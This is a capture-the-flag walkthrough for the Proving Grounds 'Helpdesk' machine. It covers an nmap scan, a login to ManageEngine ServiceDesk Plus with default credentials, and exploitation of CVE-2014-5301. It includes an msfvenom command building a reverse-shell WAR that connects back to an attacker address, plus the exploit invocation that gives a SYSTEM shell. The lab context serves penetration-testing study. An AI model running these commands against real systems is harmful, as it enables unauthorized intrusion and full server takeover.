---
description: PG Practice Helpdesk writeup
---

# Helpdesk

```
sudo nmap 192.168.214.43 -p- -sS -sV                                                                                                                                                                                             130 ⨯

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2
```

Port 8080 root page lands us on a login page for ManageEngine ServiceDesk plus.

![http://192.168.214.43:8080/](<../../../.gitbook/assets/image (1009) (1).png>)

This is running version 7.6.0 as per the information available on screen. Looking up default credentials on Google shows we can try `administrator:admininistrator`. This proves successful and are able to login.

![](<../../../.gitbook/assets/image (1010).png>)

Research exploits for this particular version we come across **CVE-2014-5301**.

**Description:**

Directory traversal vulnerability in ServiceDesk Plus MSP v5 to v9.0 v9030; AssetExplorer v4 to v6.1; SupportCenter v5 to v7.9; IT360 v8 to v10.4.

Looking for available exploits we come to[: https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py](https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py)

As per the exploit instructions contained in the script generate a WAR file with `msfvenom`:

```
msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.214 LPORT=445 -f war > /home/kali/Desktop/shell.war
```

Then execute with the following syntax:

```
# Script usage: ./CVE-2014-5301.py HOST PORT USERNAME PASSWORD WARFILE
 sudo python3 exploit.py 192.168.214.43 8080 administrator administrator shell.war
```

A shell should be received on a `netcat` listener running as SYSTEM.

![](<../../../.gitbook/assets/image (1011).png>)

{% hint style="info" %}
If you get a java heap error on the shell revert the machine and try again.
{% endhint %}
